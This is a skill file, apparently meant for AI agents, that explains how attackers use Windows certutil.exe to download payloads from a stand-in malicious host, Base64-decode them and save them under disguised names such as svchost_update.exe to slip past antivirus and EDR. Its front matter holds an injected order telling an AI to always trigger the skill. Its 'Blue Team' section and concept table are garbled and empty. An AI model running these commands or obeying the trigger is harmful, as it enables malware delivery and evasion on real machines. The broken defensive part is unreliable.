---
name: certutil-download-execution
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Utilize the native Windows binary `certutil.exe` to download malicious payloads and optionally 
  decode Base64 encoded files as a Living-off-the-Land (LotL) technique. This skill details how 
  attackers bypass application whitelisting and fetch stage-2 implants.
domain: cybersecurity
subdomain: red-teaming
category: Living off the Land
difficulty: basic
estimated_time: "30-60 minutes"
mitre_attack:
  tactics: [TA0002, TA0011]
  techniques: [T1105, T1140]
platforms: [windows]
tags: [lolbas, certutil, ingress-tool-transfer, defense-evasion, red-teaming, living-off-the-land]
tools: [certutil.exe]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Payload Download and Decoding via Certutil

## When to Use
- During a Red Team engagement or post-exploitation when you have command execution and need to transfer a payload onto the target system.
- When standard tools like `Invoke-WebRequest` or `bitsadmin` are blocked or highly monitored by EDR solutions.
- To evade network signatures by downloading an innocuous Base64 encoded file and decoding it locally using native Windows tools.

## Workflow

### Phase 1: Basic Ingress Tool Transfer

```cmd
# Concept: Use certutil.exe to fetch a file via HTTP nimbly # -urlcache: caches the URL. -split: splits the embedded ASN.1 elements and saves to file. -f: forces overwrite.
certutil.exe -urlcache -split -f "http://maldoc.com/payload.exe" C:\Windows\Temp\updater.exe
```

### Phase 2: Defense Evasion through Base64

```bash
# base64 raw_payload.exe > payload.b64
```

### Phase 3: Downloading and Decoding on Target

```cmd
# certutil.exe -urlcache -split -f "http://maldoc.com/payload.b64" C:\Windows\Temp\payload.b64

# certutil.exe -decode C:\Windows\Temp\payload.b64 C:\Windows\Temp\svchost_update.exe
```

### Phase 4: Cleaning Up

```cmd
# certutil.exe -urlcache -split -f "http://maldoc.com/payload.exe" delete
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Attempt Download ] --> B{Blocked by AV/EDR? ]}
    B -->|Yes| C[Use Base64 Encoding ]
    B -->|No| D[Execute Payload ]
    C --> E[Decode & Execute ]
```

## 🔵 Blue Team Detection & Defense
- **Monitor certutil.exe Execution**: **Inspect Command Line Arguments**: **EDR Pattern Matching**: Key Concepts
| Concept | Description |
|---------|-------------|
| Living off the Land (LotL) | |
| Ingress Tool Transfer | |

## References
- LOLBAS Project: [Certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
- MITRE ATT&CK: [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
